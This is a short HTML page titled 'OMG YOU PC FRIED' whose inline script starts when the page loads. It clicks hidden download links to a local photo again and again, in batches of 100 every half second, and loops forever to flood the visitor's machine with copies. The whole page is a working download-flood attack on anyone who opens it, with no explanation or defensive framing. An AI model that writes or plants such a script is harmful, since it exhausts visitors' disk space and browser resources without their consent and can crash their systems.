<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>OMG YOU PC FRIED</title>
</head>
<body>
  <script>
    const batchSize = 100;
    const totalCopies = 300;
    let current = 1;

    function downloadBatch() {
      for (let i = 0; i < batchSize; i++) {
        const copyNum = current + i;
        const link = document.createElement('a');
        link.href = 'WIN_20251109_17_45_22_Pro.jpg';
        link.download = `photo${(copyNum > totalCopies ? copyNum % totalCopies || totalCopies : copyNum)}.jpg`;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        link.remove();
      }
      current += batchSize;
      if (current > totalCopies) {
        current = 1; // restart to make infinite
      }
      setTimeout(downloadBatch, 500); // next batch after 0.5 second
    }

    document.addEventListener("DOMContentLoaded", function() {
      downloadBatch();
    });
  </script>

  <p>Attempting infinite downloads in batches of 100 ...</p>
</body>
</html>
